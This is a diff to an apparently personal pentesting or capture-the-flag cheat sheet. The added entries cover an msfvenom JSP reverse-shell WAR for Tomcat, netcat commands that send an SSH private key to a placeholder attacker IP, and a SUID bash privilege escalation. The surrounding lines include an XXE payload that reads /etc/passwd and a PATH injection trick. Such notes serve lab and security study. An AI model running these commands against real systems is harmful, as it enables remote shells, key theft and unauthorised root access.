@@ -206,10 +206,26 @@ show tables;
 
 When doing sql queries, if you add \G to the end, it will show the fields in a vertical list which makes tables with a lot of fields sooo much easier to read.  e.g., SELECT * FROM users\G;
 
+TOMCAT
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=6666 -f war -o rev.war
+
+UNZIP
+gzip -kd archive.gz
+tar -xvf archive.tar
+
+EXFILTRATE
+nc <YOUR IP> <PORT> < id_rsa
+nc -nlvp <PORT> > id_rsa
+
 XXE
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
            <bugreport>  
            <title>&xxe;</title>
+           
+SUID (THROUGH ROOT CMD EXEC)
+chmod +s /bin/bash
+bash -p
+#
 
 PATH INJECTION VULN
 export PATH=$(pwd):$PATH
